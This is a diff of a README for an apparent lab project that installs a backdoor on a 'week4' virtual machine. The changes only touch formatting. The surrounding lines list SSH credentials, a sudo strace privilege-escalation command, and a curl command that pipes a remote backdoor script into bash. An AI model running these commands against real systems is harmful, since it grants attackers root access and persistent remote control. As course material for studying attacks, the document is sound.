@@ -1,6 +1,6 @@
 # Project
 
-Project File Overview<br>
+Project File Overview<br><br>
 Bash Scripts (Deployed on Target):
 
 - backdoor: Deployment script
@@ -31,7 +31,7 @@ Guest Port: 4444<br>
 
 ___________________________________
 
-ssh into the week4 virtual machine<br>
+ssh into the week4 virtual machine:<br>
 User: user<br>
 Password: hill<br>
 
@@ -42,7 +42,7 @@ ___________________________________
 
 To escalate privileges use this command:
 
-Command:sudo strace -o /dev/null /bin/bash<br>
+Command: sudo strace -o /dev/null /bin/bash<br>
 Command: cd (Change Directory)<br>
 Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash<br>
 
